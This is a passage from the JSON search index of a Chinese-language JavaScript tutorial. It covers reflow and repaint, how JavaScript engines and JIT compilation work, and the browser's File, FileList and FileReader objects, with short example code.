style . height = ( currentHeight * 2 ) + 'px' ; }); } all_my_elements . forEach ( doubleHeight ); \u4e0a\u9762\u7684\u7b2c\u4e00\u6bb5\u4ee3\u7801\uff0c\u6bcf\u8bfb\u4e00\u6b21 DOM\uff0c\u5c31\u5199\u5165\u65b0\u7684\u503c\uff0c\u4f1a\u9020\u6210\u4e0d\u505c\u7684\u91cd\u6392\u548c\u91cd\u6d41\u3002\u7b2c\u4e8c\u6bb5\u4ee3\u7801\u628a\u6240\u6709\u7684\u5199\u64cd\u4f5c\uff0c\u90fd\u7d2f\u79ef\u5728\u4e00\u8d77\uff0c\u4ece\u800c DOM \u4ee3\u7801\u53d8\u52a8\u7684\u4ee3\u4ef7\u5c31\u6700\u5c0f\u5316\u4e86\u3002","title":"\u91cd\u6d41\u548c\u91cd\u7ed8"},{"location":"bom/engine/#javascript","text":"JavaScript \u5f15\u64ce\u7684\u4e3b\u8981\u4f5c\u7528\u662f\uff0c\u8bfb\u53d6\u7f51\u9875\u4e2d\u7684 JavaScript \u4ee3\u7801\uff0c\u5bf9\u5176\u5904\u7406\u540e\u8fd0\u884c\u3002 JavaScript \u662f\u4e00\u79cd\u89e3\u91ca\u578b\u8bed\u8a00\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u4e0d\u9700\u8981\u7f16\u8bd1\uff0c\u7531\u89e3\u91ca\u5668\u5b9e\u65f6\u8fd0\u884c\u3002\u8fd9\u6837\u7684\u597d\u5904\u662f\u8fd0\u884c\u548c\u4fee\u6539\u90fd\u6bd4\u8f83\u65b9\u4fbf\uff0c\u5237\u65b0\u9875\u9762\u5c31\u53ef\u4ee5\u91cd\u65b0\u89e3\u91ca\uff1b\u7f3a\u70b9\u662f\u6bcf\u6b21\u8fd0\u884c\u90fd\u8981\u8c03\u7528\u89e3\u91ca\u5668\uff0c\u7cfb\u7edf\u5f00\u9500\u8f83\u5927\uff0c\u8fd0\u884c\u901f\u5ea6\u6162\u4e8e\u7f16\u8bd1\u578b\u8bed\u8a00\u3002 \u4e3a\u4e86\u63d0\u9ad8\u8fd0\u884c\u901f\u5ea6\uff0c\u76ee\u524d\u7684\u6d4f\u89c8\u5668\u90fd\u5c06 JavaScript \u8fdb\u884c\u4e00\u5b9a\u7a0b\u5ea6\u7684\u7f16\u8bd1\uff0c\u751f\u6210\u7c7b\u4f3c\u5b57\u8282\u7801\uff08bytecode\uff09\u7684\u4e2d\u95f4\u4ee3\u7801\uff0c\u4ee5\u63d0\u9ad8\u8fd0\u884c\u901f\u5ea6\u3002 \u65e9\u671f\uff0c\u6d4f\u89c8\u5668\u5185\u90e8\u5bf9 JavaScript \u7684\u5904\u7406\u8fc7\u7a0b\u5982\u4e0b\uff1a \u8bfb\u53d6\u4ee3\u7801\uff0c\u8fdb\u884c\u8bcd\u6cd5\u5206\u6790\uff08Lexical analysis\uff09\uff0c\u5c06\u4ee3\u7801\u5206\u89e3\u6210\u8bcd\u5143\uff08token\uff09\u3002 \u5bf9\u8bcd\u5143\u8fdb\u884c\u8bed\u6cd5\u5206\u6790\uff08parsing\uff09\uff0c\u5c06\u4ee3\u7801\u6574\u7406\u6210\u201c\u8bed\u6cd5\u6811\u201d\uff08syntax tree\uff09\u3002 \u4f7f\u7528\u201c\u7ffb\u8bd1\u5668\u201d\uff08translator\uff09\uff0c\u5c06\u4ee3\u7801\u8f6c\u4e3a\u5b57\u8282\u7801\uff08bytecode\uff09\u3002 \u4f7f\u7528\u201c\u5b57\u8282\u7801\u89e3\u91ca\u5668\u201d\uff08bytecode interpreter\uff09\uff0c\u5c06\u5b57\u8282\u7801\u8f6c\u4e3a\u673a\u5668\u7801\u3002 \u9010\u884c\u89e3\u91ca\u5c06\u5b57\u8282\u7801\u8f6c\u4e3a\u673a\u5668\u7801\uff0c\u662f\u5f88\u4f4e\u6548\u7684\u3002\u4e3a\u4e86\u63d0\u9ad8\u8fd0\u884c\u901f\u5ea6\uff0c\u73b0\u4ee3\u6d4f\u89c8\u5668\u6539\u4e3a\u91c7\u7528\u201c\u5373\u65f6\u7f16\u8bd1\u201d\uff08Just In Time compiler\uff0c\u7f29\u5199 JIT\uff09\uff0c\u5373\u5b57\u8282\u7801\u53ea\u5728\u8fd0\u884c\u65f6\u7f16\u8bd1\uff0c\u7528\u5230\u54ea\u4e00\u884c\u5c31\u7f16\u8bd1\u54ea\u4e00\u884c\uff0c\u5e76\u4e14\u628a\u7f16\u8bd1\u7ed3\u679c\u7f13\u5b58\uff08inline cache\uff09\u3002\u901a\u5e38\uff0c\u4e00\u4e2a\u7a0b\u5e8f\u88ab\u7ecf\u5e38\u7528\u5230\u7684\uff0c\u53ea\u662f\u5176\u4e2d\u4e00\u5c0f\u90e8\u5206\u4ee3\u7801\uff0c\u6709\u4e86\u7f13\u5b58\u7684\u7f16\u8bd1\u7ed3\u679c\uff0c\u6574\u4e2a\u7a0b\u5e8f\u7684\u8fd0\u884c\u901f\u5ea6\u5c31\u4f1a\u663e\u8457\u63d0\u5347\u3002 \u5b57\u8282\u7801\u4e0d\u80fd\u76f4\u63a5\u8fd0\u884c\uff0c\u800c\u662f\u8fd0\u884c\u5728\u4e00\u4e2a\u865a\u62df\u673a\uff08Virtual Machine\uff09\u4e4b\u4e0a\uff0c\u4e00\u822c\u4e5f\u628a\u865a\u62df\u673a\u79f0\u4e3a JavaScript \u5f15\u64ce\u3002\u5e76\u975e\u6240\u6709\u7684 JavaScript \u865a\u62df\u673a\u8fd0\u884c\u65f6\u90fd\u6709\u5b57\u8282\u7801\uff0c\u6709\u7684 JavaScript \u865a\u62df\u673a\u57fa\u4e8e\u6e90\u7801\uff0c\u5373\u53ea\u8981\u6709\u53ef\u80fd\uff0c\u5c31\u901a\u8fc7 JIT\uff08just in time\uff09\u7f16\u8bd1\u5668\u76f4\u63a5\u628a\u6e90\u7801\u7f16\u8bd1\u6210\u673a\u5668\u7801\u8fd0\u884c\uff0c\u7701\u7565\u5b57\u8282\u7801\u6b65\u9aa4\u3002\u8fd9\u4e00\u70b9\u4e0e\u5176\u4ed6\u91c7\u7528\u865a\u62df\u673a\uff08\u6bd4\u5982 Java\uff09\u7684\u8bed\u8a00\u4e0d\u5c3d\u76f8\u540c\u3002\u8fd9\u6837\u505a\u7684\u76ee\u7684\uff0c\u662f\u4e3a\u4e86\u5c3d\u53ef\u80fd\u5730\u4f18\u5316\u4ee3\u7801\u3001\u63d0\u9ad8\u6027\u80fd\u3002\u4e0b\u9762\u662f\u76ee\u524d\u6700\u5e38\u89c1\u7684\u4e00\u4e9b JavaScript \u865a\u62df\u673a\uff1a Chakra (Microsoft Internet Explorer) Nitro/JavaScript Core (Safari) Carakan (Opera) SpiderMonkey (Firefox) V8 (Chrome, Chromium)","title":"JavaScript \u5f15\u64ce"},{"location":"bom/engine/#_10","text":"John Dalziel, The race for speed part 2: How JavaScript compilers work Jake Archibald, Deep dive into the murky waters of script loading Mozilla Developer Network, window.setTimeout Remy Sharp, Throttling function calls Ayman Farhat, An alternative to JavaScript's evil setInterval Ilya Grigorik, Script-injected \"async scripts\" considered harmful Axel Rauschmayer, ECMAScript 6 promises (\u00bd): foundations Daniel Imms, async vs defer attributes Craig Buckler, Load Non-blocking JavaScript with HTML5 Async and Defer Domenico De Felice, How browsers work","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"bom/file/","text":"File \u5bf9\u8c61\uff0cFileList \u5bf9\u8c61\uff0cFileReader \u5bf9\u8c61 \u00b6 File \u5bf9\u8c61 \u00b6 File \u5bf9\u8c61\u4ee3\u8868\u4e00\u4e2a\u6587\u4ef6\uff0c\u7528\u6765\u8bfb\u5199\u6587\u4ef6\u4fe1\u606f\u3002\u5b83\u7ee7\u627f\u4e86 Blob \u5bf9\u8c61\uff0c\u6216\u8005\u8bf4\u662f\u4e00\u79cd\u7279\u6b8a\u7684 Blob \u5bf9\u8c61\uff0c\u6240\u6709\u53ef\u4ee5\u4f7f\u7528 Blob \u5bf9\u8c61\u7684\u573a\u5408\u90fd\u53ef\u4ee5\u4f7f\u7528\u5b83\u3002 \u6700\u5e38\u89c1\u7684\u4f7f\u7528\u573a\u5408\u662f\u8868\u5355\u7684\u6587\u4ef6\u4e0a\u4f20\u63a7\u4ef6\uff08 <input type=\"file\"> \uff09\uff0c\u7528\u6237\u9009\u4e2d\u6587\u4ef6\u4ee5\u540e\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a\u6570\u7ec4\uff0c\u91cc\u9762\u662f\u6bcf\u4e00\u4e2a\u7528\u6237\u9009\u4e2d\u7684\u6587\u4ef6\uff0c\u5b83\u4eec\u90fd\u662f File \u5b9e\u4f8b\u5bf9\u8c61\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <input id=\"fileItem\" type=\"file\"> var file = document . getElementById ( 'fileItem' ). files [ 0 ]; file instanceof File // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c file \u662f\u7528\u6237\u9009\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6587\u4ef6\uff0c\u5b83\u662f File \u7684\u5b9e\u4f8b\u3002 \u6784\u9020\u51fd\u6570 \u00b6 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a File() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 File \u5b9e\u4f8b\u5bf9\u8c61\u3002 1 new File ( array , name [, options ]) File() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002 array\uff1a\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u53ef\u4ee5\u662f\u4e8c\u8fdb\u5236\u5bf9\u8c61\u6216\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6587\u4ef6\u7684\u5185\u5bb9\u3002 name\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6587\u4ef6\u540d\u6216\u6587\u4ef6\u8def\u5f84\u3002 options\uff1a\u914d\u7f6e\u5bf9\u8c61\uff0c\u8bbe\u7f6e\u5b9e\u4f8b\u7684\u5c5e\u6027\u3002\u8be5\u53c2\u6570\u53ef\u9009\u3002 \u7b2c\u4e09\u4e2a\u53c2\u6570\u914d\u7f6e\u5bf9\u8c61\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e24\u4e2a\u5c5e\u6027\u3002 type\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5b9e\u4f8b\u5bf9\u8c61\u7684 MIME \u7c7b\u578b\uff0c\u9ed8\u8ba4\u503c\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 lastModified\uff1a\u65f6\u95f4\u6233\uff0c\u8868\u793a\u4e0a\u6b21\u4fee\u6539\u7684\u65f6\u95f4\uff0c\u9ed8\u8ba4\u4e3a Date.now() \u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 var file = new File ( [ 'foo' ], 'foo.txt' , { type : 'text/plain' , } ); \u5b9e\u4f8b\u5c5e\u6027\u548c\u5b9e\u4f8b\u65b9\u6cd5 \u00b6 File \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5b9e\u4f8b\u5c5e\u6027\u3002 File.lastModified\uff1a\u6700\u540e\u4fee\u6539\u65f6\u95f4 File.name\uff1a\u6587\u4ef6\u540d\u6216\u6587\u4ef6\u8def\u5f84 File.size\uff1a\u6587\u4ef6\u5927\u5c0f\uff08\u5355\u4f4d\u5b57\u8282\uff09 File.type\uff1a\u6587\u4ef6\u7684 MIME \u7c7b\u578b 1 2 3 4 5 6 7 var myFile = new File ([], 'file.bin' , { lastModified : new Date ( 2018 , 1 , 1 ), }); myFile . lastModified // 1517414400000 myFile . name // \"file.bin\" myFile . size // 0 myFile . type // \"\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e myFile \u7684\u5185\u5bb9\u4e3a\u7a7a\uff0c\u4e5f\u6ca1\u6709\u8bbe\u7f6e MIME \u7c7b\u578b\uff0c\u6240\u4ee5 size \u5c5e\u6027\u7b49\u4e8e0\uff0c type \u5c5e\u6027\u7b49\u4e8e\u7a7a\u5b57\u7b26\u4e32\u3002 File \u5bf9\u8c61\u6ca1\u6709\u81ea\u5df1\u7684\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u7531\u4e8e\u7ee7\u627f\u4e86 Blob \u5bf9\u8c61\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528 Blob \u7684\u5b9e\u4f8b\u65b9\u6cd5 slice() \u3002 FileList \u5bf9\u8c61 \u00b6 FileList \u5bf9\u8c61\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u4ee3\u8868\u4e00\u7ec4\u9009\u4e2d\u7684\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6210\u5458\u90fd\u662f\u4e00\u4e2a File \u5b9e\u4f8b\u3002\u5b83\u4e3b\u8981\u51fa\u73b0\u5728\u4e24\u4e2a\u573a\u5408\u3002 \u6587\u4ef6\u63a7\u4ef6\u8282\u70b9\uff08 <input type=\"file\"> \uff09\u7684 files \u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a FileList \u5b9e\u4f8b\u3002 \u62d6\u62c9\u4e00\u7ec4\u6587\u4ef6\u65f6\uff0c\u76ee\u6807\u533a\u7684 DataTransfer.files \u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a FileList \u5b9e\u4f8b\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <input id=\"fileItem\" type=\"file\"> var files = document . getElementById ( 'fileItem' ). files ; files instanceof FileList // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6587\u4ef6\u63a7\u4ef6\u7684 files \u5c5e\u6027\u662f\u4e00\u4e2a FileList \u5b9e\u4f8b\u3002 FileList \u7684\u5b9e\u4f8b\u5c5e\u6027\u4e3b\u8981\u662f length \uff0c\u8868\u793a\u5305\u542b\u591a\u5c11\u4e2a\u6587\u4ef6\u3002 FileList \u7684\u5b9e\u4f8b\u65b9\u6cd5\u4e3b\u8981\u662f item() \uff0c\u7528\u6765\u8fd4\u56de\u6307\u5b9a\u4f4d\u7f6e\u7684\u5b9e\u4f8b\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u4f4d\u7f6e\u7684\u5e8f\u53f7\uff08\u4ece\u96f6\u5f00\u59cb\uff09\u3002\u4f46\u662f\uff0c\u7531\u4e8e FileList \u7684\u5b9e\u4f8b\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u5373 myFileList[0] \u7b49\u540c\u4e8e myFileList.item(0) \uff0c\u6240\u4ee5\u4e00\u822c\u7528\u4e0d\u5230 item() \u65b9\u6cd5\u3002 FileReader \u5bf9\u8c61 \u00b6 FileReader \u5bf9\u8c61\u7528\u4e8e\u8bfb\u53d6 File \u5bf9\u8c61\u6216 Blob \u5bf9\u8c61\u6240\u5305\u542b\u7684\u6587\u4ef6\u5185\u5bb9\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a FileReader \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 FileReader \u5b9e\u4f8b\u3002 1 var reader = new FileReader (); FileReader \u6709\u4ee5\u4e0b\u7684\u5b9e\u4f8b\u5c5e\u6027\u3002 FileReader.error\uff1a\u8bfb\u53d6\u6587\u4ef6\u65f6\u4ea7\u751f\u7684\u9519\u8bef\u5bf9\u8c61 FileReader.readyState\uff1a\u6574\u6570\uff0c\u8868\u793a\u8bfb\u53d6\u6587\u4ef6\u65f6\u7684\u5f53\u524d\u72b6\u6001\u3002\u4e00\u5171\u6709\u4e09\u79cd\u53ef\u80fd\u7684\u72b6\u6001\uff0c 0 \u8868\u793a\u5c1a\u672a\u52a0\u8f7d\u4efb\u4f55\u6570\u636e\uff0c 1 \u8868\u793a\u6570\u636e\u6b63\u5728\u52a0\u8f7d\uff0c 2 \u8868\u793a\u52a0\u8f7d\u5b8c\u6210\u3002 FileReader.result\uff1a\u8bfb\u53d6\u5b8c\u6210\u540e\u7684\u6587\u4ef6\u5185\u5bb9\uff0c\u6709\u53ef\u80fd\u662f\u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u80fd\u662f\u4e00\u4e2a ArrayBuffer \u5b9e\u4f8b\u3002 FileReader.onabort\uff1a abort \u4e8b\u4ef6\uff08\u7528\u6237\u7ec8\u6b62\u8bfb\u53d6\u64cd\u4f5c\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 FileReader.onerror\uff1a error \u4e8b\u4ef6\uff08\u8bfb\u53d6\u9519\u8bef\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 FileReader.onload\uff1a load \u4e8b\u4ef6\uff08\u8bfb\u53d6\u64cd\u4f5c\u5b8c\u6210\uff09\u7684\u76d1\u542c\u51fd\u6570\uff0c\u901a\u5e38\u5728\u8fd9\u4e2a\u51fd\u6570\u91cc\u9762\u4f7f\u7528 result \u5c5e\u6027\uff0c\u62ff\u5230\u6587\u4ef6\u5185\u5bb9\u3002 FileReader.onloadstart\uff1a loadstart \u4e8b\u4ef6\uff08\u8bfb\u53d6\u64cd\u4f5c\u5f00\u59cb\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 FileReader.onloadend\uff1a loadend \u4e8b\u4ef6\uff08\u8bfb\u53d6\u64cd\u4f5c\u7ed3\u675f\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 FileReader.onprogress\uff1a progress \u4e8b\u4ef6\uff08\u8bfb\u53d6\u64cd\u4f5c\u8fdb\u884c\u4e2d\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u76d1\u542c load \u4e8b\u4ef6\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"file\" onchange=\"onChange(event)\"> function onChange ( event ) { var file = event . target . files [ 0 ]; var reader = new FileReader (); reader . onload = function ( event ) { console . log ( event . target . result ) }; reader . readAsText ( file ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6bcf\u5f53\u6587\u4ef6\u63a7\u4ef6\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u5c1d\u8bd5\u8bfb\u53d6\u7b2c\u4e00\u4e2a\u6587\u4ef6\u3002\u5982\u679c\u8bfb\u53d6\u6210\u529f\uff08 load \u4e8b\u4ef6\u53d1\u751f\uff09\uff0c\u5c31\u6253\u5370\u51fa\u6587\u4ef6\u5185\u5bb9\u3002 FileReader \u6709\u4ee5\u4e0b\u5b9e\u4f8b\u65b9\u6cd5\u3002 FileReader.abort()\uff1a\u7ec8\u6b62\u8bfb\u53d6\u64cd\u4f5c\uff0c readyState \u5c5e\u6027\u5c06\u53d8\u6210 2 \u3002 FileReader.readAsArrayBuffer()\uff1a\u4ee5 ArrayBuffer \u7684\u683c\u5f0f\u8bfb\u53d6\u6587\u4ef6\uff0c\u8bfb\u53d6\u5b8c\u6210\u540e result \u5c5e\u6027\u5c06\u8fd4\u56de\u4e00\u4e2a ArrayBuffer \u5b9e\u4f8b\u3002 FileReader.readAsBinaryString()\uff1a\u8bfb\u53d6\u5b8c\u6210\u540e\uff0c result \u5c5e\u6027\u5c06\u8fd4\u56de\u539f\u59cb\u7684\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u3002 FileReader.readAsDataURL()\uff1a\u8bfb\u53d6\u5b8c\u6210\u540e\uff0c result \u5c5e\u6027\u5c06\u8fd4\u56de\u4e00\u4e2a Data URL \u683c\u5f0f\uff08Base64 \u7f16\u7801\uff09\u7684\u5b57\u7b26\u4e32\uff0c\u4ee3\u8868\u6587\u4ef6\u5185\u5bb9\u3002\u5bf9\u4e8e\u56fe\u7247\u6587\u4ef6\uff0c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u53ef\u4ee5\u7528\u4e8e <img> \u5143\u7d20\u7684 src \u5c5e\u6027\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4e0d\u80fd\u76f4\u63a5\u8fdb\u884c Base64 \u89e3\u7801\uff0c\u5fc5\u987b\u628a\u524d\u7f00 data:*/*;base64, \u4ece\u5b57\u7b26\u4e32\u91cc\u5220\u9664\u4ee5\u540e\uff0c\u518d\u8fdb\u884c\u89e3\u7801\u3002 FileReader.readAsText()\uff1a\u8bfb\u53d6\u5b8c\u6210\u540e\uff0c result \u5c5e\u6027\u5c06\u8fd4\u56de\u6587\u4ef6\u5185\u5bb9\u7684\u6587\u672c\u5b57\u7b26\u4e32\u3002\u8be5\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4ee3\u8868\u6587\u4ef6\u7684 Blob \u5b9e\u4f8b\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u8868\u793a\u6587\u672c\u7f16\u7801\uff0c\u9ed8\u8ba4\u4e3a UTF-8\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /* HTML \u4ee3\u7801\u5982\u4e0b <input type=\"file\" onchange=\"previewFile()\"> <img src=\"\" height=\"200\"> */ function previewFile () { var preview = document . querySelector ( 'img' ); var file = document . querySelector ( 'input[type=file]' ). files [ 0 ]; var reader = new FileReader (); reader . addEventListener ( 'load' , function () { preview . src = reader . result ; }, false ); if ( file ) { reader . readAsDataURL ( file ); } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7528\u6237\u9009\u4e2d\u56fe\u7247\u6587\u4ef6\u4ee5\u540e\uff0c\u811a\u672c\u4f1a\u81ea\u52a8\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u7136\u540e\u4f5c\u4e3a\u4e00\u4e2a Data URL \u8d4b\u503c\u7ed9 <img> \u5143\u7d20\u7684 src \u5c5e\u6027\uff0c\u4ece\u800c\u628a\u56fe\u7247\u5c55\u793a\u51fa\u6765\u3002","title":"File \u5bf9\u8c61\uff0cFileList \u5bf9\u8c61\uff0cFileReader \u5bf9\u8c61"},{"location":"bom/file/#file-filelist-filereader","text":"","title":"File \u5bf9\u8c61\uff0cFileList \u5bf9\u8c61\uff0cFileReader \u5bf9\u8c61"},{"location":"bom/file/#file","text":"File \u5bf9\u8c61\u4ee3\u8868\u4e00\u4e2a\u6587\u4ef6\uff0c\u7528\u6765\u8bfb\u5199\u6587\u4ef6\u4fe1\u606f\u3002\u5b83\u7ee7\u627f\u4e86 Blob \u5bf9\u8c61\uff0c\u6216\u8005\u8bf4\u662f\u4e00\u79cd\u7279\u6b8a\u7684 Blob \u5bf9\u8c61\uff0c\u6240\u6709\u53ef\u4ee5\u4f7f\u7528 Blob \u5bf9\u8c61\u7684\u573a\u5408\u90fd\u53ef\u4ee5\u4f7f\u7528\u5b83\u3002 \u6700\u5e38\u89c1\u7684\u4f7f\u7528\u573a\u5408\u662f\u8868\u5355\u7684\u6587\u4ef6\u4e0a\u4f20\u63a7\u4ef6\uff08 <input type=\"file\"> \uff09\uff0c\u7528\u6237\u9009\u4e2d\u6587\u4ef6\u4ee5\u540e\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a\u6570\u7ec4\uff0c\u91cc\u9762\u662f\u6bcf\u4e00\u4e2a\u7528\u6237\u9009\u4e2d\u7684\u6587\u4ef6\uff0c\u5b83\u4eec\u90fd\u662f File \u5b9e\u4f8b\u5bf9\u8c61\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <input id=\"fileItem\" type=\"file\"> var file = document . getElementById ( 'fileItem' ). files [ 0 ]; file instanceof File // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c file \u662f\u7528\u6237\u9009\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6587\u4ef6\uff0c\u5b83\u662f File \u7684\u5b9e\u4f8b\u3002","title":"File \u5bf9\u8c61"},{"location":"bom/file/#_1","text":"\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a File() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 File \u5b9e\u4f8b\u5bf9\u8c61\u3002 1 new File ( array , name [, options ]) File() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002 array\uff1a\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u53ef\u4ee5\u662f\u4e8c\u8fdb\u5236\u5bf9\u8c61\u6216\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6587\u4ef6\u7684\u5185\u5bb9\u3002 name\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6587\u4ef6\u540d\u6216\u6587\u4ef6\u8def\u5f84\u3002 options\uff1a\u914d\u7f6e\u5bf9\u8c61\uff0c\u8bbe\u7f6e\u5b9e\u4f8b\u7684\u5c5e\u6027\u3002\u8be5\u53c2\u6570\u53ef\u9009\u3002 \u7b2c\u4e09\u4e2a\u53c2\u6570\u914d\u7f6e\u5bf9\u8c61\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e24\u4e2a\u5c5e\u6027\u3002 type\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5b9e\u4f8b\u5bf9\u8c61\u7684 MIME \u7c7b\u578b\uff0c\u9ed8\u8ba4\u503c\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 lastModified\uff1a\u65f6\u95f4\u6233\uff0c\u8868\u793a\u4e0a\u6b21\u4fee\u6539\u7684\u65f6\u95f4\uff0c\u9ed8\u8ba4\u4e3a Date.now() \u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 var file = new File ( [ 'foo' ], 'foo.txt' , { type : 'text/plain' , } );","title":"\u6784\u9020\u51fd\u6570"},{"location":"bom/file/#_2","text":"File \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5b9e\u4f8b\u5c5e\u6027\u3002 File.lastModified\uff1a\u6700\u540e\u4fee\u6539\u65f6\u95f4 File.name\uff1a\u6587\u4ef6\u540d\u6216\u6587\u4ef6\u8def\u5f84 File.size\uff1a\u6587\u4ef6\u5927\u5c0f\uff08\u5355\u4f4d\u5b57\u8282\uff09 File.type\uff1a\u6587\u4ef6\u7684 MIME \u7c7b\u578b 1 2 3 4 5 6 7 var myFile = new File ([], 'file.bin' , { lastModified : new Date ( 2018 , 1 , 1 ), }); myFile . lastModified // 1517414400000 myFile . name // \"file.bin\" myFile . size // 0 myFile . type // \"\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e myFile \u7684\u5185\u5bb9\u4e3a\u7a7a\uff0c\u4e5f\u6ca1\u6709\u8bbe\u7f6e MIME \u7c7b\u578b\uff0c\u6240\u4ee5 size \u5c5e\u6027\u7b49\u4e8e0\uff0c type \u5c5e\u6027\u7b49\u4e8e\u7a7a\u5b57\u7b26\u4e32\u3002 File \u5bf9\u8c61\u6ca1\u6709\u81ea\u5df1\u7684\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u7531\u4e8e\u7ee7\u627f\u4e86 Blob \u5bf9\u8c61\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528 Blob \u7684\u5b9e\u4f8b\u65b9\u6cd5 slice() \u3002","title":"\u5b9e\u4f8b\u5c5e\u6027\u548c\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"bom/file/#filelist","text":"FileList \u5bf9\u8c61\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u4ee3\u8868\u4e00\u7ec4\u9009\u4e2d\u7684\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6210\u5458\u90fd\u662f\u4e00\u4e2a File \u5b9e\u4f8b\u3002\u5b83\u4e3b\u8981\u51fa\u73b0\u5728\u4e24\u4e2a\u573a\u5408\u3002 \u6587\u4ef6\u63a7\u4ef6\u8282\u70b9\uff08 <input type=\"file\"> \uff09\u7684 files \u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a FileList \u5b9e\u4f8b\u3002 \u62d6\u62c9\u4e00\u7ec4\u6587\u4ef6\u65f6\uff0c\u76ee\u6807\u533a\u7684 DataTransfer.files \u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a FileList \u5b9e\u4f8b\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <input id=\"fileItem\" type=\"file\"> var files = document . getElementById ( 'fileItem' ). files ; files instanceof FileList // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6587\u4ef6\u63a7\u4ef6\u7684 files \u5c5e\u6027\u662f\u4e00\u4e2a FileList \u5b9e\u4f8b\u3002 FileList \u7684\u5b9e\u4f8b\u5c5e\u6027\u4e3b\u8981\u662f length \uff0c\u8868\u793a\u5305\u542b\u591a\u5c11\u4e2a\u6587\u4ef6\u3002 FileList \u7684\u5b9e\u4f8b\u65b9\u6cd5\u4e3b\u8981\u662f item() 